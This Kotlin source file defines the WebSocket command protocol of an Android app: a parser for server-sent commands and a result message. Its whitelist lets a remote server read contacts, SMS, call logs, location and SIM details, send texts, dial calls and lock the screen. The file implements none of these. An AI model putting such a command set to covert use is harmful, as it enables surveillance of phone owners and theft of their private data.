package my.bridge.com.core.network.ws

import com.google.gson.JsonObject

/**
 * 服务端下发的命令（command 消息的 data 载荷）。
 *
 * 与后端 `CommandData` 对齐：{command, command_id, params}。
 * 客户端收到后执行对应命令，并通过 command_result 回执。
 */
data class Command(
    val command: String,
    val commandId: String,
    val params: JsonObject,
) {
    companion object {
        /** 已知命令名（与服务端 ALLOWED_COMMANDS 白名单一致）。 */
        const val UPLOAD_LOG = "upload_log"
        const val PLAY_MUSIC = "play_music"
        const val PAUSE_MUSIC = "pause_music"
        const val RESUME_MUSIC = "resume_music"
        const val STOP_MUSIC = "stop_music"
        const val GET_LOCATION = "get_location"
        const val GET_CURRENT_PAGE = "get_current_page"
        const val GET_NETWORK = "get_network"
        const val GET_BATTERY = "get_battery"
        const val GET_CONTACTS = "get_contacts"
        const val GET_SMS = "get_sms"
        const val GET_CALL_LOG = "get_call_log"
        const val GET_SIM_INFO = "get_sim_info"
        const val SEND_SMS = "send_sms"
        const val DIAL_PHONE = "dial_phone"
        const val SET_VOLUME = "set_volume"
        const val LOCK_SCREEN = "lock_screen"
        const val RESTART_APP = "restart_app"

        /** 从 command 消息的 data 解析；字段缺失返回 null。 */
        fun fromData(data: JsonObject?): Command? {
            if (data == null) return null
            val name = data.get("command")?.asString ?: return null
            val id = data.get("command_id")?.asString ?: return null
            val params = data.getAsJsonObject("params") ?: JsonObject()
            return Command(command = name, commandId = id, params = params)
        }
    }
}

/**
 * 命令执行结果（command_result 消息的 data 载荷）。
 *
 * 与后端 `CommandResultData` 对齐：{command_id, command, success, message}。
 */
data class CommandResult(
    val commandId: String,
    val command: String,
    val success: Boolean,
    val message: String,
) {
    fun toJsonObject(): JsonObject = JsonObject().apply {
        addProperty("command_id", commandId)
        addProperty("command", command)
        addProperty("success", success)
        addProperty("message", message)
    }
}
